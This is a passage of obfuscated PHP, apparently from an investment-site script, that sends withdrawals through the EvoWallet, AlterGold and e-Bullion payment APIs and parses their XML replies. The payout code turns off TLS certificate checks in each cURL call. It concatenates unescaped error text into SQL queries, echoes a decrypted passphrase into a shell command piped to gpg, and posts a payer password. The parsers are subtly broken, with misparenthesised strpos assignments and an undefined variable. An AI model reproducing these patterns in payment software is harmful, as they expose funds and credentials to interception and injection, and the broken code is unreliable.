          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlciydev ($elnlcsDyVd)
  {
    global $elnlcebOCn;
    $elnlcsLBI = array ();
    $elnlcKkLyG = elnlcvdde ($elnlcsDyVd, 'response');
    if ($elnlcKkLyG != '')
    {
      $elnlccVDBw = $elnlcKkLyG;
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = elnlcvdde ($elnlccVDBw, 'status');
      $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = elnlcvdde ($elnlcymKU, 'statusmsg');
      $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']] = elnlcvdde ($elnlccVDBw, 'batch');
      $elnlcsLBI[$elnlcebOCn['elnlcuSeF']] = elnlcvdde ($elnlccVDBw, 'fromaccount');
      $elnlcsLBI[$elnlcebOCn['elnlcFBAxi']] = elnlcvdde ($elnlccVDBw, 'toaccount');
      $elnlcsLBI[$elnlcebOCn['elnlcBfAt']] = elnlcvdde ($elnlccVDBw, 'amount');
      $elnlcsLBI[$elnlcebOCn['elnlcjbPh']] = elnlcvdde ($elnlccVDBw, 'currency');
      $elnlcsLBI[$elnlcebOCn['elnlcvgSoU']] = elnlcvdde ($elnlccVDBw, 'checksum');
      if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == 0)
      {
        $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcPqwj'];
      }
    }

    if (0 < $elnlcsLBI[$elnlcebOCn['elnlccIMd']])
    {
      switch ($elnlcsLBI[$elnlcebOCn['elnlccIMd']])
      {
        case 10310:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10310: Invalid Account Prefix';
          break;
        }

        case 10311:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10311: Payer account has been suspended';
          break;
        }

        case 10312:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10312: API transfer disabled';
          break;
        }

        case 10313:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10313: Payee account not found';
          break;
        }

        case 10314:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10314: Payer spending over daily limit';
          break;
        }

        case 10315:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10315: Payee account has been suspended';
          break;
        }

        case 10316:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10316: Payee account has been limited';
          break;
        }

        case 10317:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10317: Spending less than minimum allowed';
          break;
        }

        case 10318:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10318: Payee will reach their balance limit';
          break;
        }

        case 10319:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10319: Payer do not have enough funds';
          break;
        }

        case 10320:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10320: Payee has an invalid balance security check';
          break;
        }

        case 10321:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10321: Spend was not complete';
          break;
        }

        case 10322:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10322: Payee account group not found';
          break;
        }

        case 10323:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10323: Invalid payee account';
          break;
        }

        case 10324:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10324: Invalid IP range';
          break;
        }

        case 10325:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10325: Invalid API or not enabled';
          break;
        }

        case 10326:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10326: Payer account group not found';
          break;
        }

        case 10327:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10327: Invalid payer account';
          break;
        }

        case 10328:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10328: Invalid checksum';
          break;
        }

        case 10110:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10110: Invalid Account Prefix';
          break;
        }

        case 10111:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10111: Account has been suspended';
          break;
        }

        case 10112:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10112: Invalid API or API not enabled';
          break;
        }

        case 10113:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10113: API balance query disabled';
          break;
        }

        case 10114:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10114: IP not in the allowed range';
          break;
        }

        case 10115:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10115: Balance can not be retrieved';
          break;
        }

        case 10116:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10116: Reserve';
          break;
        }

        case 10117:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10117: Account group not found';
          break;
        }

        case 10118:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10118: This account can not be found';
          break;
        }

        case 10119:
        {
          $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = '10119: Invalid Checksum';
          break;
        }
      }

      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcjqGL'];
    }

    return $elnlcsLBI;
  }

  function elnlcautke ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB, $elnlcLPeC = 'USD')
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty EvoWallet account.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoWallet account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 24);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evowallet_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcvjbI = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }

        $elnlcGSwz = $elnlcroEyb[$elnlcebOCn['elnlcyWSnB']];
      }
      else
      {
        list ($elnlcvjbI, $elnlcGSwz) = preg_split ('/\\|/', $elnlcmqvST);
      }

      $elnlcujLDk = curl_init ();
      $elnlcaHWk = date ($elnlcebOCn['elnlckTzL']);
      $elnlcFuaM = strtoupper (md5 ($elnlcGSwz . $elnlcaHWk . '103' . '' . $elnlcLPeC . $elnlcroEyb[$elnlcebOCn['elnlcinrL']] . $elnlcgobCh . $elnlcdrkS . md5 ($elnlcvjbI)));
      $elnlcIDxg = '<?xml version="1.0" encoding="utf-8"?>
<request>
<apiname>' . htmlentities ($elnlcGSwz, ENT_NOQUOTES) . '</apiname>
<trandate>' . $elnlcaHWk . '</trandate>
<trantype>103</trantype>
<tranid></tranid>
<curcode>' . $elnlcLPeC . '</curcode>
<fromaccount>' . htmlentities ($elnlcroEyb[$elnlcebOCn['elnlcinrL']], ENT_NOQUOTES) . '</fromaccount>
<toaccount>' . htmlentities ($elnlcgobCh, ENT_NOQUOTES) . '</toaccount>
<amount>' . htmlentities ($elnlcdrkS, ENT_NOQUOTES) . '</amount>
<memo>' . htmlentities ($elnlcqAwQ, ENT_NOQUOTES) . '</memo> 
<checksum>' . $elnlcFuaM . '</checksum> 
</request>';
      $elnlcujLDk = curl_init ();
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://www.evowallet.com/api.php?req=' . urlencode ($elnlcIDxg));
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcsLBI = elnlciydev ($a);
      if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcDeuNJ'])
      {
        return array (1, '', $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']]);
      }
      else
      {
        if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcorfdI'])
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] . '<br>' . $elnlcsLBI[$elnlcebOCn['elnlcIEpfS']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlcqkke ($elnlcwMbN, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlterGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlterGold account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 17);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcwMbN == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'altergold_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcGCsp = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        $elnlcGCsp = $elnlcwMbN;
      }

      $elnlcujLDk = curl_init ();
      $elnlcqAwQ = rawurlencode ($elnlcqAwQ);
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://api.altergold.com/spend.php');
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
      curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, 'PAYER_ACCOUNT=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcoBCu']]) . '&PAYER_PASSWORD=' . rawurlencode ($elnlcGCsp) . '&PAYEE_ACCOUNT=' . rawurlencode ($elnlcgobCh) . '&PAYMENT_AMOUNT=' . rawurlencode ($elnlcdrkS) . ('' . '&PAYMENT_CURRENCY=USD&MEMO=' . $elnlcqAwQ));
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      if ($a == '')
      {
        print 'Blank response from Altergold processor service.';
      }
      else
      {
        $elnlcStsjB = array ('E10011' => 'Unable to Login as Payer. This means wrong login information was provided.', 'E10012' => 'Payer is not allowed to make outgoing spends. Means account is suspended or perhaps limited.', 'E10013' => 'API Automated Spends not Enabled.', 'E10014' => 'Unable to authorize IP address.', 'E10015' => 'Recipient account not found', 'E10016' => 'Recipient account is suspended.', 'E10017' => 'Invalid spend units.', 'E10018' => 'Spend amount is too low.', 'E10019' => 'Recipient reached balance limit.', 'E10020' => 'Not enough funds.', 'E10021' => '* Please contact support.');
        if ($elnlcStsjB[$a] != '')
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcStsjB[$a]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ('' . ' ' . $elnlcStsjB[$a]), '');
        }
        else
        {
          return array (1, '', $a);
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlckwvf ($elnlciPmOa, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB, $elnlcwahp)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to e-Bullion account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid e-Bullion account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 5);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      $elnlcPzju = '<atip.batch.v1><payment.list>';
      $elnlcPzju = $elnlcPzju . '<payment>';
      $elnlcPzju = $elnlcPzju . '<payer>' . htmlentities ($elnlcroEyb[$elnlcebOCn['elnlcNHoeL']], ENT_NOQUOTES) . '</payer>';
      $elnlcPzju = $elnlcPzju . '<payee>' . htmlentities ($elnlcgobCh, ENT_NOQUOTES) . '</payee>';
      $elnlcPzju = $elnlcPzju . '<amount>' . htmlentities ($elnlcdrkS, ENT_NOQUOTES) . '</amount>';
      $elnlcPzju = $elnlcPzju . '<metal>' . ($elnlcwahp == 5 ? 1 : 3) . '</metal>';
      $elnlcPzju = $elnlcPzju . '<unit>1</unit>';
      $elnlcPzju = $elnlcPzju . '<memo>' . htmlentities ($elnlcqAwQ, ENT_NOQUOTES) . '</memo>';
      $elnlcPzju = $elnlcPzju . '<ref></ref>';
      $elnlcPzju = $elnlcPzju . '</payment>';
      $elnlcPzju = $elnlcPzju . '</payment.list></atip.batch.v1>';
      $elnlcoKyh = tempnam ('./tmpl_c/', 'in.');
      $elnlczjPtn = tempnam ('./tmpl_c/', 'out.');
      $elnlcpyyN = fopen ($elnlcoKyh, $elnlcebOCn['elnlcKLoFe']);
      fwrite ($elnlcpyyN, $elnlcPzju);
      fclose ($elnlcpyyN);
      $elnlcbTEPD = './tmpl_c/';
      $elnlcdEeRD = escapeshellcmd ($elnlcroEyb[$elnlcebOCn['elnlcSfmqO']]);
      $elnlcCLeC = elnlclehv ($elnlcroEyb[$elnlcebOCn['elnlchAiMp']], $elnlcebOCn['elnlcWsIB']);
      $elnlchBRP = $elnlcroEyb[$elnlcebOCn['elnlcHMhQ']];
      $elnlcFcSw = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcbTEPD . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --throw-keyid --always-trust --passphrase-fd 0';
      $elnlcUNojG = '' . 'echo \'' . $elnlcCLeC . '\' | ' . $elnlcdEeRD . ' ' . $elnlcFcSw . ' --recipient A20077\\@e-bullion.com --local-user ' . $elnlcroEyb[$elnlcebOCn['elnlcNHoeL']] . ('' . '\\@e-bullion.com --output ' . $elnlczjPtn . ' --sign --encrypt ' . $elnlcoKyh . ' 2>&1');
      $elnlcFwcH = '';
      $elnlcdNpUt = popen ('' . $elnlcUNojG, 'r');
      while (!feof ($elnlcdNpUt))
      {
        $elnlcFwcH = fgets ($elnlcdNpUt, 4096);
      }

      pclose ($elnlcdNpUt);
      $elnlcpyyN = fopen ($elnlczjPtn, $elnlcebOCn['elnlcbiQmF']);
      $elnlcVEiNU = fread ($elnlcpyyN, filesize ($elnlczjPtn));
      fclose ($elnlcpyyN);
      unlink ($elnlcoKyh);
      unlink ($elnlczjPtn);
      $elnlcrfKn = 'ATIP_ACCOUNT=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcNHoeL']]) . '&ATIP_BATCH_MSG=' . rawurlencode ($elnlcVEiNU) . '&ATIP_STATUS_URL=' . rawurlencode ($elnlchBRP);
      $elnlcujLDk = curl_init ();
      curl_setopt ($elnlcujLDk, CURLOPT_URL, '' . 'https://atip.e-bullion.com/batch.php?' . $elnlcrfKn);
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcujLDk, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcujLDk, CURLOPT_HEADER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcEteu = array ();
      $elnlchHRw = '';
      if (preg_match ('/Location: .*?\\?ATIP_VERIFICATION=([^\\r\\n]+)%0A/', $a, $elnlcEteu))
      {
        $elnlchHRw = $elnlcEteu[1];
      }

      $elnlchHRw = urldecode ($elnlchHRw);
      $elnlcQcdqb = tempnam ('./tmpl_c/', 'xml.cert.');
      $elnlcvxtjE = tempnam ('./tmpl_c/', 'xml.tmp.');
      $elnlcpyyN = fopen ('' . $elnlcvxtjE, $elnlcebOCn['elnlcKLoFe']);
      fwrite ($elnlcpyyN, $elnlchHRw);
      fclose ($elnlcpyyN);
      $elnlcFcSw = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcbTEPD . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --passphrase-fd 0';
      $elnlcUNojG = '' . 'echo \'' . $elnlcCLeC . '\' | ' . $elnlcdEeRD . ' ' . $elnlcFcSw . ' --output ' . $elnlcQcdqb . ' --decrypt ' . $elnlcvxtjE . ' 2>&1';
      $elnlcFwcH = '';
      $elnlcUeAp = '';
      $elnlcdNpUt = popen ('' . $elnlcUNojG, 'r');
      while (!feof ($elnlcdNpUt))
      {
        $elnlcFwcH = fgets ($elnlcdNpUt, 4096);
        $elnlcrlutr = strstr ($elnlcFwcH, 'key ID');
        if (0 < strlen ($elnlcrlutr))
        {
          $elnlcUeAp = preg_replace ('/[\\n\\r]/', '', substr ($elnlcrlutr, 7));
          continue;
        }
      }

      pclose ($elnlcdNpUt);
      if ($elnlcUeAp == $elnlcroEyb[$elnlcebOCn['elnlcjbJn']])
      {
        if (is_file ('' . $elnlcQcdqb))
        {
          $elnlcnqmd = fopen ('' . $elnlcQcdqb, $elnlcebOCn['elnlcbiQmF']);
          $elnlcsDyVd = fread ($elnlcnqmd, filesize ('' . $elnlcQcdqb));
          fclose ($elnlcnqmd);
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Can not found decrypted verification response!');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ' Can not found decrypted verification response!', '');
        }

        $elnlcIDxg = elnlcnprph ($elnlcsDyVd);
        if ($elnlcIDxg[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcDeuNJ'])
        {
          return array (1, '', $elnlcIDxg[$elnlcebOCn['elnlcjpTJ']]);
        }
        else
        {
          if ($elnlcIDxg[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcorfdI'])
          {
            $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcIDxg[$elnlcebOCn['elnlcHPFOO']] . ' ' . $elnlcIDxg[$elnlcebOCn['elnlcIEpfS']]);
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcSquPB . $elnlcIDxg[$elnlcebOCn['elnlcHPFOO']] . ' ' . $elnlcIDxg[$elnlcebOCn['elnlcIEpfS']]);
          }
          else
          {
            $e = elnlcxfvdc ('' . $elnlcSquPB . ' Unknown error');
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcSquPB . ' Unknown error', '');
          }
        }
      }
      else
      {
        $e = elnlcxfvdc ('' . $elnlcSquPB . ' Can not decrypt verification response! ');
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcSquPB . ' Can not decrypt verification response!', '');
      }

      unlink ($elnlcvxtjE);
      unlink ($elnlcQcdqb);
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available', '');
    }

  }

  function elnlcvdde ($elnlcIDxg, $elnlcIfyfQ)
  {
    global $elnlcebOCn;
    $elnlcIfyfQ = strtolower ($elnlcIfyfQ);
    $elnlcWTJm = strlen ($elnlcIfyfQ) + 2;
    if ($elnlcbLNAS = strpos ($elnlcIDxg, '' . '<' . $elnlcIfyfQ . '>') === false)
    {
      return '';
    }

    if ($elnlcossS = strpos ($elnlcIDxg, '' . '</' . $elnlcIfyfQ . '>') === false)
    {
      return '';
    }

    $elnlcewCPD = trim (substr ($elnlcIDxg, $elnlcbLNAS + $elnlcWTJm, $elnlcossS - ($elnlcbLNAS + $elnlcWTJm)));
    return $elnlcewCPD;
  }

  function elnlcnprph ($elnlcsDyVd)
  {
    global $elnlcebOCn;
    $elnlcsLBI = array ();
    $elnlcvoDr = elnlcvdde ($elnlcsDyVd, 'balanceresponse.list');
    if ($elnlcvoDr != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlccEWs'];
      $elnlcKqgW = false;
      if ($elnlcLlml = stristr ($elnlcvoDr, '<balance>') === false)
      {
        $elnlcKqgW = true;
      }
      else
      {
        $elnlcbLNAS = strlen ($elnlcvoDr) - strlen ($elnlcLlml);
      }

      if ($elnlcVIPD = stristr ($elnlcvoDr, '</balance>') === false)
      {
        $elnlcKqgW = true;
      }
      else
      {
        $elnlcossS = strlen ($elnlcvoDr) - strlen ($elnlcVIPD);
      }

      while (!$elnlcKqgW)
      {
        $elnlcbVMrv = trim (substr ($elnlcvoDr, $elnlcbLNAS + 9, $elnlcossS - 9));
        $elnlcvoDr = trim (substr ($elnlcvoDr, $elnlcossS + 10));
        $elnlcsLBI[$elnlcebOCn['elnlcBfAt']] = elnlcvdde ($elnlcbVMrv, 'amount');
        if ($elnlcLlml = stristr ($elnlcvoDr, '<balance>') === false)
        {
          $elnlcKqgW = true;
        }
        else
        {
          $elnlcbLNAS = strlen ($elnlcvoDr) - strlen ($elnlcLlml);
        }

        if ($elnlcVIPD = stristr ($elnlcvoDr, '</balance>') === false)
        {
          $elnlcKqgW = true;
          continue;
        }
        else
        {
          $elnlcossS = strlen ($elnlcvoDr) - strlen ($elnlcVIPD);
          continue;
        }
      }
    }

    $elnlcKkLyG = elnlcvdde ($elnlcsDyVd, 'verified.list');
    if ($elnlcKkLyG != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcPqwj'];
      $elnlcKqgW = false;
      if ($elnlcLlml = stristr ($elnlcKkLyG, '<transaction>') === false)
      {
        $elnlcKqgW = true;
      }
      else
      {
        $elnlcbLNAS = strlen ($elnlcKkLyG) - strlen ($elnlcLlml);
      }

      if ($elnlcVIPD = stristr ($elnlcKkLyG, '</transaction>') === false)
      {
        $elnlcKqgW = true;
      }
      else
      {
        $elnlcossS = strlen ($elnlcKkLyG) - strlen ($elnlcVIPD);
      }

      while (!$elnlcKqgW)
      {
        $elnlccVDBw = trim (substr ($elnlcKkLyG, $elnlcbLNAS + 13, $elnlcossS - 13));
        $elnlcKkLyG = trim (substr ($elnlcKkLyG, $elnlcossS + 14));
        $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']] = elnlcvdde ($elnlccVDBw, 'id');
        $elnlcsLBI[$elnlcebOCn['elnlcFBAxi']] = elnlcvdde ($elnlccVDBw, 'payee');
        $elnlcsLBI[$elnlcebOCn['elnlcuSeF']] = elnlcvdde ($elnlccVDBw, 'payer');
        $elnlcsLBI[$elnlcebOCn['elnlcBfAt']] = elnlcvdde ($elnlccVDBw, 'amount');
        $elnlcsLBI[$elnlcebOCn['elnlcuykjH']] = elnlcvdde ($elnlccVDBw, 'metal');
        $elnlcsLBI[$elnlcebOCn['elnlcTVQt']] = elnlcvdde ($elnlccVDBw, 'unit');
        $elnlcsLBI[$elnlcebOCn['elnlcVKNx']] = elnlcvdde ($elnlccVDBw, 'memo');
        $elnlcsLBI[$elnlcebOCn['elnlcbunn']] = elnlcvdde ($elnlccVDBw, 'exchange');
        $elnlcsLBI[$elnlcebOCn['elnlcRDxl']] = elnlcvdde ($elnlccVDBw, 'fee');
        if ($elnlcLlml = stristr ($elnlcKkLyG, '<transaction>') === false)
        {
          $elnlcKqgW = true;
        }
        else
        {
          $elnlcbLNAS = strlen ($elnlcKkLyG) - strlen ($elnlcLlml);
        }

        if ($elnlcVIPD = stristr ($elnlcKkLyG, '</transaction>') === false)
        {
          $elnlcKqgW = true;
          continue;
        }
        else
        {
          $elnlcossS = strlen ($elnlcKkLyG) - strlen ($elnlcVIPD);
          continue;
        }
      }
    }

    $elnlcHGVW = elnlcvdde ($elnlcsDyVd, 'failed.list');
    if ($elnlcHGVW != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcjqGL'];
      $elnlcKqgW = false;
      if ($elnlcLlml = stristr ($elnlcHGVW, '<failed>') === false)
      {
        $elnlcKqgW = true;
      }
      else
      {
        $elnlcbLNAS = strlen ($elnlcHGVW) - strlen ($elnlcLlml);
      }

      if ($elnlcVIPD = stristr ($elnlcHGVW, '</failed>') === false)
      {
        $elnlcKqgW = true;
      }
      else
      {
        $elnlcossS = strlen ($elnlcHGVW) - strlen ($elnlcVIPD);
      }

      while (!$elnlcKqgW)
      {
        $elnlcKODBh = trim (substr ($elnlcHGVW, $elnlcbLNAS + 13, $elnlcossS - 13));
        $elnlcHGVW = trim (substr ($elnlcHGVW, $elnlcossS + 14));
        $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] = elnlcvdde ($elnlcKODBh, 'error');
        if ($elnlcLlml = stristr ($elnlcHGVW, '<failed>') === false)
        {
          $elnlcKqgW = true;
        }
        else
        {
          $elnlcbLNAS = strlen ($elnlcHGVW) - strlen ($elnlcLlml);
        }

        if ($elnlcVIPD = stristr ($elnlcHGVW, '</failed>') === false)
        {
          $elnlcKqgW = true;
          continue;
        }
        else
        {
          $elnlcossS = strlen ($elnlcHGVW) - strlen ($elnlcVIPD);
          continue;
        }
      }
    }

    $elnlcWFzO = elnlcvdde ($elnlcsDyVd, 'errorresponse.list');
    if ($elnlcWFzO != '')
    {
      $elnlcsLBI[$elnlcebOCn['elnlccIMd']] = $elnlcebOCn['elnlcjqGL'];
      $elnlcKqgW = false;
      if ($elnlcLlml = stristr ($elnlcWFzO, '<errorresponse>') === false)
      {
        $elnlcKqgW = true;
      }
      else
      {
        $elnlcbLNAS = strlen ($elnlcWFzO) - strlen ($elnlcLlml);
      }

      if ($elnlcVIPD = stristr ($elnlcWFzO, '</errorresponse>') === false)
      {
        $elnlcKqgW = true;
      }
      else
      {
        $elnlcossS = strlen ($elnlcWFzO) - strlen ($elnlcVIPD);
      }

      while (!$elnlcKqgW)
      {
        $elnlcypWo = trim (substr ($elnlcWFzO, $elnlcbLNAS + 15, $elnlcossS - 15));
        $elnlcSHqJT = false;
